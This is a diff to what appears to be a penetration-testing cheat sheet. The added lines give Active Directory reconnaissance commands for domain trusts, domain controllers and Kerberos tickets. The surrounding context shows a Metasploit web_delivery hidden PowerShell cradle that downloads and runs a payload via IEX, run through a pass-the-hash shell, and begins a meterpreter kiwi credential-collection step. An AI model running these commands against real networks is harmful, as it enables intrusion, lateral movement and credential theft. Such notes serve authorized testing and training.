@@ -425,7 +425,51 @@ msf exploit(web_delivery) > [*] Local IP: http://10.2.15.194:8080/gOAr7kQOTh
 powershell.exe -nop -w hidden -c $j=new-object net.webclient;$j.proxy=[Net.WebRequest]::GetSystemWebProxy();$j.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX $j.downloadstring('http://127.0.0.1:8080/gOAr7kQOTh');
 ```
 Copy the powershell command into the cmd opened with pth_winexe
+# Active Directory
+```
+# current domain info
+[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
 
+# domain trusts
+([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()).GetAllTrustRelationships()
+
+# current forest info
+[System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest()
+
+# get forest trust relationships
+([System.DirectoryServices.ActiveDirectory.Forest]::GetForest((New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext('Forest', 'forest-of-interest.local')))).GetAllTrustRelationships()
+
+# get DCs of a domain
+nltest /dclist:offense.local
+net group "domain controllers" /domain
+
+# get DC for currently authenticated session
+nltest /dsgetdc:offense.local
+
+# get domain trusts from cmd shell
+nltest /domain_trusts
+
+# get user info
+nltest /user:"spotless"
+
+# get DC for currently authenticated session
+set l
+
+# get domain name and DC the user authenticated to
+klist
+
+# get all logon sessions. Includes NTLM authenticated sessions
+klist sessions
+
+# kerberos tickets for the session
+klist
+
+# cached krbtgt
+klist tgt
+
+# whoami on older Windows systems
+set u
+```
 # Kiwi collect credentials
 ```
 meterpreter > load kiwi
